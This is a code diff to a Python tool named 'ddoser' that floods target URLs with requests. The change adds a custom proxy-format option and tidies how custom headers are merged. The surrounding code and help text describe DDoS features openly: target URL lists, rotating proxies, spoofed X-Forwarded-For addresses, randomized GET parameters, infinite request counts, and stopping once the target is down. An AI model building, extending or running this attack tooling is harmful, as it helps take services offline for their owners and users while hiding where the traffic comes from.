@@ -161,12 +161,12 @@ def process(
         target_url: Tuple[str], target_urls_file: Tuple[str], proxy_url: str, proxy_file: str,
         concurrency: int, count: int, timeout: int, with_random_get_param: bool,
         user_agent: str, verbose: bool, ignore_response: bool, log_to_stdout: bool, random_xff_ip: bool,
-        custom_headers: Dict[str, str], stop_attack: int, shuffle_proxy: bool
+        custom_headers: Dict[str, str], stop_attack: int, shuffle_proxy: bool, proxy_custom_format: str,
 ):
     config_logger(verbose, log_to_stdout)
     uvloop.install()
     set_limits()
-    proxies = load_proxies(proxy_file, proxy_url, shuffle=shuffle_proxy)
+    proxies = load_proxies(proxy_file, proxy_url, shuffle=shuffle_proxy, custom_format=proxy_custom_format)
     targets = load_targets(target_urls_file)
     targets.extend(target_url)
     loop = asyncio.get_event_loop()
@@ -201,7 +201,7 @@ def merge_headers(custom_headers: str, header: List[Tuple[str, str]]) -> Dict[st
 @click.command(help="Run ddoser")
 @click.option('--target-url', help='ddos target url', multiple=True)
 @click.option('--target-urls-file', help='path or url to file contains urls to ddos', multiple=True)
-@click.option('--proxy-url', help='url to proxy resourse')
+@click.option('--proxy-url', help='url to proxy resourсe')
 @click.option('--proxy-file', help='path to file with proxy list')
 @click.option('--concurrency', help='concurrency level', type=int, default=1)
 @click.option('--count', help='requests count (0 for infinite)', type=int, default=1)
@@ -217,23 +217,25 @@ def merge_headers(custom_headers: str, header: List[Tuple[str, str]]) -> Dict[st
 @click.option('--stop-attack', help='stop the attack when the target is down after N tries', type=int, default=0)
 @click.option('--shuffle-proxy', help='Shuffle proxy list on application start', is_flag=True, default=False)
 @click.option('-H', '--header', multiple=True, help='custom header', type=(str, str))
+@click.option('--proxy-custom-format', help='custom proxy format like "{protocol}://{ip}:{port} {login}:{password}" '
+                                            '(ip and port is required, protocol can be set by --protocol)')
 def main(
         target_url: str, target_urls_file: str, proxy_url: str, proxy_file: str,
         concurrency: int, count: int, timeout: int, verbose: bool, ignore_response: bool, with_random_get_param: bool,
         user_agent: str, log_to_stdout: str, restart_period: int, random_xff_ip: bool, custom_headers: str,
-        stop_attack: int, shuffle_proxy: bool, header: List[Tuple[str, str]],
+        stop_attack: int, shuffle_proxy: bool, header: List[Tuple[str, str]], proxy_custom_format: str,
 ):
     config_logger(verbose, log_to_stdout)
     if not target_urls_file and not target_url:
         raise SystemExit('--target-url or --target-urls-file is required')
+    custom_headers_dict = merge_headers(custom_headers, header)
     while True:
-        custom_headers = merge_headers(custom_headers, header)
         proc = multiprocessing.Process(
             target=process,
             args=(target_url, target_urls_file, proxy_url, proxy_file,
                   concurrency, count, timeout, with_random_get_param,
-                  user_agent, verbose, ignore_response, log_to_stdout, random_xff_ip, custom_headers,
-                  stop_attack, shuffle_proxy)
+                  user_agent, verbose, ignore_response, log_to_stdout, random_xff_ip,
+                  custom_headers_dict, stop_attack, shuffle_proxy, proxy_custom_format)
         )
         proc.start()
         proc.join(restart_period)
